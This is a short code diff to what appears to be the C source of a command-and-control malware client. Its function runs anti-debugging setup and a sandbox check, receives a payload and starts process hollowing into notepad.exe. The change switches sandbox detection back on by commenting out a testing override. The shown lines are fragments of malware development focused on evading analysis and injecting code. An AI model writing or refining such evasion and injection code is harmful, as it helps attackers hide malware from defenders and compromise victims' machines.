@@ -221,7 +221,7 @@ void run_c2_client() {
     InitAntiDebug();
     
     // Test some API calls to verify monitoring is working (Currently empty)
- 
+    
 
 
     
@@ -232,7 +232,7 @@ void run_c2_client() {
     int sandbox_result = check_sandbox();
 
     // For testing, force no sandbox detected, comment if detection wanted
-    sandbox_result = 0;  
+    //sandbox_result = 0;  
     
     if (sandbox_result) {
         printf("\n[CRITICAL] SANDBOX DETECTED! Terminating...\n");
@@ -396,7 +396,7 @@ void run_c2_client() {
         
         printf("Complete payload received: %d bytes total\n", total_size);
         
-        // Use Process Hollowing instead of direct execution
+        // Use Process Hollowing
         printf("\n=== INITIATING PROCESS HOLLOWING ===\n");
         const char* targetProcess = "C:\\Windows\\System32\\notepad.exe";
         
